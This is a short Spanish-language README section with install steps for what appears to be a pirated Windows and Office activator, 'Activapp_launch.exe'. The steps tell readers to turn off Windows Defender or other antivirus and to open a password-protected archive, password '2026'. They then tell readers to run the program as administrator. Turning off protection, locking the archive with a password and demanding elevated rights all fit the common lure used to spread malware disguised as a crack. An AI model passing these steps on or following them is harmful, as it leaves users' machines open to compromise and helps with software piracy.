## 📥 <span id="instalación--uso-básico">Instalación y Uso Básico</span>

Sigue estos pasos para una activación exitosa:

1. **Desactiva Windows Defender o el antivirus** temporalmente (pueden bloquear el activador).
2. **Extrae el archivo** usando WinRAR o 7-Zip (contraseña: `2026`).
3. **Ejecuta `Activapp_launch.exe` como administrador** (clic derecho → Ejecutar como administrador).
4. **Haz clic en Activar Windows o Activar Office** según el producto que desees.
5. **Espera a que termine** (10-30 segundos) y **reinicia tu PC**.

El proceso completo es intuitivo y toma menos de cinco minutos.
